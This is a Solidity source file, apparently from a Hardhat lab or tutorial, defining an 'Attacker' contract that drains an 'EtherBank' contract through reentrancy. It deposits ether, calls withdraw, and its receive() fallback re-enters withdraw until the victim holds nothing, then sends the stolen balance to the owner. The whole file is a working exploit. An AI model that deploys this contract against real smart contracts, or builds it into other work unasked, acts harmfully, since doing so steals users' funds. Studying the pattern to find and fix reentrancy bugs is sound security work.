// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
import "hardhat/console.sol";

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IEtherBank public immutable etherBank;
    address private owner;

    constructor(address etherBankAddress) payable {
        etherBank = IEtherBank(etherBankAddress);
        owner = msg.sender;
    }

    function attack() external payable onlyOwner {
        etherBank.deposit{value: address(this).balance}();
        etherBank.withdraw();
    }

    receive() external payable {
        console.log("Receive triggered. Current balance:", address(this).balance);
        if (address(etherBank).balance > 0) {
            console.log("reentering...");
            etherBank.withdraw();
        } else {
            console.log('victim account drained');
            payable(owner).transfer(address(this).balance);
        }
    }

    // check the total balance of the Attacker contract
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Only the owner can attack.");
        _;
    } 
}